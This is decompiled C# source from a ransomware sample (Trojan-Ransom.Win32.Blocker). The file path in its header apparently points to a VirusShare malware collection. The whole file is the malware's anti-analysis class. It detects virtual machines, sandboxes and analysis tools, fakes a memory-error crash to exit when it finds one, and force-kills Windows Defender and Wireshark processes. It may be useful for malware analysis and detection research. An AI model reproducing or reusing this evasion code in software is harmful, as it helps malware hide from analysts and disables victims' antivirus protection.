// Decompiled with JetBrains decompiler
// Type: rundll32.antis
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace rundll32
{
  internal class antis
  {
    public static void Check()
    {
      if (antis.AVPC())
        antis.iSdbg();
      else if (antis.AA1())
        antis.iSdbg();
      else if (antis.AA12())
        antis.iSdbg();
      else if (antis.AS())
        antis.iSdbg();
      else if (antis.AVB())
        antis.iSdbg();
      else if (antis.ASB())
        antis.iSdbg();
      else if (antis.ATE())
        antis.iSdbg();
      antis.AntiWinDef1();
      antis.AntiWinDef2();
      antis.AntiWireShark();
    }

    private static void iSdbg()
    {
      int num = (int) MessageBox.Show("Application Error: The instruction at \"0x7883b4\" referenced memory at \"0x004467\". The memory could not be \"read\".", "Critical Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
      Environment.Exit(0);
    }

    private static bool AVB() => antis.prcIsRunning("VBoxService");

    private static bool ASB() => Directory.Exists("C:\\analysis");

    private static void AntiWireShark()
    {
      if (!antis.prcIsRunning("wireshark"))
        return;
      antis.killProcess("wireshark");
    }

    private static void AntiWinDef1()
    {
      if (!antis.prcIsRunning("MSASCui"))
        return;
      antis.killProcess("MSASCui");
    }

    private static void AntiWinDef2()
    {
      if (!antis.prcIsRunning("msmpeng"))
        return;
      antis.killProcess("msmpeng");
    }

    private static bool AS() => Process.GetProcessesByName("SbieSvc").Length >= 1 | Process.GetProcessesByName("sniff_hit").Length >= 1 | Process.GetProcessesByName("sysAnalyzer").Length >= 1;

    private static bool AA1() => Application.ExecutablePath == Application.StartupPath + "\\sample.exe";

    private static bool ATE() => Process.GetCurrentProcess().MainModule.FileName.Contains("sample");

    private static bool AA12() => (string) Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", false).GetValue("ProductId") == "76487-337-8429955-22614";

    private static bool AVPC() => Process.GetProcessesByName("vpcmap").Length >= 4 & Process.GetProcessesByName("vmsrvc").Length >= 4 || Process.GetProcessesByName("vmusrvc").Length >= 4;

    private static bool prcIsRunning(string process)
    {
      foreach (Process process1 in Process.GetProcesses())
      {
        if (process1.ProcessName.Contains(process))
          return true;
      }
      return false;
    }

    private static void killProcess(string process)
    {
      foreach (Process process1 in Process.GetProcesses())
      {
        if (process1.ProcessName.Contains(process))
        {
          try
          {
            process1.Kill();
          }
          catch
          {
          }
        }
      }
    }
  }
}
